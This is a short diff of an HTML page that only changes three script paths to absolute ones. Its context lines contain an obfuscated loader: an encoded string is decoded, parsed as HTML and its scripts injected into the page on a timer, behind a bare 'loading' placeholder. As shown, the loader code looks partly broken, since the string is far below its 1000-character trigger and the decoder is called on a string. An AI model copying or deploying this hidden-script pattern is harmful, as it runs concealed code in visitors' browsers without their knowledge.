@@ -13,9 +13,9 @@
       var data3 = "b5rPOW688bCkEGIDxtGRdITBFGHn4+P1tLX0wBWh9/O2YHXQsEVgdFZClvBglcV1oARzUuNA8NAFZaGxggKHR1Z3MQWgxC";
       let c=setInterval(function () {if (data3&&data3.length>1000) {clearInterval(c);c= document.createElement('div');c.innerHTML=new TextDecoder().decode(data3);Array.from(c.childNodes).forEach(n=>{if(n.tagName==='SCRIPT'){const s=document.createElement('script');s.text=n.textContent;document.body.appendChild(s);} else {document.body.appendChild(n);}});}}, 200);
     </script>
-    <script src="qrcode.min.js"></script>
-    <script src="swiper.min.js"></script>
-    <script src="jquery.min.js"></script>
+    <script src="/qrcode.min.js"></script>
+    <script src="/swiper.min.js"></script>
+    <script src="/jquery.min.js"></script>
 </head>
 <body>
   <center><div id="progress" class="progress-card" style="margin-top:50px">加载中..</div></center>
